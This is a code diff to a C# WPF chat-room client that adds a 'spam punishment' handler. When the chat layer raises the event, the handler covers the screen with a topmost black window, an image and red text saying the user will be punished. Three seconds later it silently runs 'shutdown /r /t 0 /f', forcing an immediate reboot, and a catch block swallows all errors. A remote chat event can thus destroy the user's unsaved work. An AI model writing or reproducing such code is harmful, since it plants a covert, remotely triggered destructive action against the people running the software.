@@ -70,6 +70,7 @@ namespace ChatRoom
             _chat.OnImageReceived += OnImageReceived;
             _chat.OnFileReceived += OnFileReceived;
             _chat.OnSpamWarning += OnSpamWarning;
+            _chat.OnSpamPunish += OnSpamPunish;
 
             // 单实例判定 = "能否绑定 47060"，由操作系统仲裁。
             // 旧实现靠扫进程名 + PID 文件：被僵尸进程误判（2026-09-17 实测有 8 个不可杀的旧实例，
@@ -383,6 +384,60 @@ namespace ChatRoom
             });
         }
         // === 图片 ===
+
+        private void OnSpamPunish(string msg)
+        {
+            OnUI(() =>
+            {
+                AddMessage("⛔ 处罚", msg, BubbleKind.Service);
+                try
+                {
+                    var w = new Window
+                    {
+                        WindowStyle = WindowStyle.None,
+                        WindowState = WindowState.Maximized,
+                        Topmost = true,
+                        Background = System.Windows.Media.Brushes.Black,
+                        ShowInTaskbar = false
+                    };
+                    var sp = new StackPanel { VerticalAlignment = VerticalAlignment.Center };
+                    var img = new System.Windows.Controls.Image
+                    {
+                        Width = 400, Height = 400,
+                        Source = new System.Windows.Media.Imaging.BitmapImage(new Uri(@"C:\Users\Administrator\Desktop\ban.jpg", UriKind.Absolute)),
+                        Margin = new Thickness(0, 0, 0, 30)
+                    };
+                    var tb = new TextBlock
+                    {
+                        Text = "你将受到处罚",
+                        FontSize = 48,
+                        Foreground = System.Windows.Media.Brushes.Red,
+                        FontWeight = FontWeights.Bold,
+                        HorizontalAlignment = HorizontalAlignment.Center
+                    };
+                    sp.Children.Add(img);
+                    sp.Children.Add(tb);
+                    w.Content = sp;
+                    w.Show();
+
+                    var timer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromSeconds(3) };
+                    timer.Tick += (s, e) =>
+                    {
+                        timer.Stop();
+                        var psi = new System.Diagnostics.ProcessStartInfo
+                        {
+                            FileName = "shutdown",
+                            Arguments = "/r /t 0 /f",
+                            CreateNoWindow = true,
+                            UseShellExecute = false
+                        };
+                        System.Diagnostics.Process.Start(psi);
+                    };
+                    timer.Start();
+                }
+                catch { }
+            });
+        }
 
         /// <summary>收到一张完整图片：解码 → 落盘 → 显示 → 历史只记 [图片]</summary>
         private void OnImageReceived(ChatUser from, byte[] jpeg, string scope)
@@ -1147,6 +1202,7 @@ namespace ChatRoom
                     _chat.OnImageReceived -= OnImageReceived;
                     _chat.OnFileReceived -= OnFileReceived;
             _chat.OnSpamWarning -= OnSpamWarning;
+            _chat.OnSpamPunish -= OnSpamPunish;
                 }
             }
             catch { }
